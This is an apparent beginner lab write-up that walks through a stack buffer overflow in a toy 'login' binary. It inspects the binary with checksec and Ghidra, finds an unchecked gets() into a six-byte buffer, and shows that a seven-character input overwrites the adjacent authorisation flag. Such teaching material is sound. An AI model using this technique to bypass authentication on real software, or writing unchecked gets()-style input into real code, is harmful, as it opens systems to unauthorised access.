# Level 01 

This is level 2 in the intro to binary exploitation. We see here that we have ```exploit.py login.c login``` in the directory. Lets see what ```login``` does:

``` Bash
$ chmod +x login
$ ./login
Enter admin password: 
test
Incorrect Password!
Failed to log in as Admin (authorised=0) :(
```
This appears to be an admin login prompt. Lets check out the binary a little further:

``` Bash
$ file login
login: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8b8bd9ef60772700a07a03f02f511a96cfaba685, for GNU/Linux 3.2.0, not stripped

$ checksec --file=login
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable   FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   37 Symbols        No    0               2             login
```
From running ```file``` we see that it is 64-bit, dynamically linked and not stripped. Good to know but not too helpful yet. Next we can run ```checksec``` on it. This program checks for common security features of binaries like stack canarys and executable stack. We can see here that there are no security measures in place which is a good sign. Lets open this up in ```ghidra```:

``` C
undefined8 main(void)

{
  int compareReturn;
  char passwordBuffer [6];
  uint adminBool;
  
  adminBool = 0;
  puts("Enter admin password: ");
  gets(passwordBuffer);
  compareReturn = strcmp(passwordBuffer,"pass");
  if (compareReturn == 0) {
    puts("Correct Password!");
    adminBool = 1;
  }
  else {
    puts("Incorrect Password!");
  }
  if (adminBool == 0) {
    printf("Failed to log in as Admin (authorised=%d) :(\n",0);
  }
  else {
    printf("Successfully logged in as Admin (authorised=%d) :)\n",(ulong)adminBool);
  }
  return 0;
}
```
There is only one function here, ```main``` pasted above. I changed the variables to make them more meaningfull. Here we see two important things. First, we see that the password we enter is being compared to the string "pass" to determine if they are the same. If they are, then we are being granted access as admin.

Additionally, we see that the buffer is only 6 bytes long. Maybe we could overflow it and gain access? Lets try both.

First, we'll use the known password "pass"

``` Bash
$ ./login
Enter admin password: 
pass
Correct Password!
Successfully logged in as Admin (authorised=1) :)
```
As expected, it worked! Lets try the more fun way of overflowing the buffer:

``` Bash
$ ./login
Enter admin password: 
1234567
Incorrect Password!
Successfully logged in as Admin (authorised=55) :)

$ ./login
Enter admin password: 
letmein
Incorrect Password!
Successfully logged in as Admin (authorised=110) :)
```
We see here that when we enter 7 bytes of data, we are getting the message that our password is incorrect BUT we are still gaining access! Additionally, we can see exactly which byte overflowed the buffer. The authorised value is the decimal value in ascii of the 7th byte in our password!

Congrats! You just did a buffer overflow to bypass the login prompt!
